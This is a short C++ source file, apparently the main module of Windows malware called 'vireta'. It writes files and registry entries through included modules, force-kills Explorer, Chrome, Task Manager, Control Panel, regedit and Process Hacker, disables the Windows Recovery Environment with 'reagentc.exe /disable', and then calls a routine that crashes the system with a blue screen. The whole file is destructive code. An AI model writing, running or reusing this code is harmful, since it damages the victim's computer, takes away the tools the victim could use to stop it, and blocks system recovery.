
#include <iostream>
#include <windows.h>
#include "registry.cpp"
#include "files.cpp"
#include "bsod.cpp"

using namespace std;

int main() {
  vireta_files::write_all();
  vireta_registry::write_all();

  system("taskkill /f /im explorer.exe");
  system("taskkill /f /im chrome.exe");
  system("taskkill /f /im taskmgr.exe");
  system("taskkill /f /im control.exe");
  system("taskkill /f /im regedit.exe");
  system("taskkill /f /im ProcessHacker.exe");
  system("reagentc.exe /disable");
  
  //PlaySound((LPCSTR)string(getenv("TEMP")) + string("\\baby.wav"), NULL, SND_LOOP | SND_ASYNC);

  vireta_bsod::kill();
  return 0;
}
